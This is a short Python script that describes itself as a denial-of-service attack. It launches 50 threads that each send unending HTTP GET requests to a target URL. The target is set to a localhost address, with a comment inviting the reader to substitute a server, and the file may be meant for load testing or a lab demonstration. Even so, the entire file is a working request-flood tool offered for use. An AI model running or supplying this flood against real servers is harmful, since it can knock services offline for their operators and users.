import requests
import threading

# The target URL (replace with your local server URL)
url = 'http://localhost:8000/index.html'

# Function to perform the DoS attack
def attack():
    while True:
        try:
            response = requests.get(url)
            print(f"Request sent, status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Request failed: {e}")

# Number of threads to create
num_threads = 50  # Adjust as needed to increase or decrease the load

# Create and start threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete (though in a real DoS, this runs indefinitely)
for thread in threads:
    thread.join()
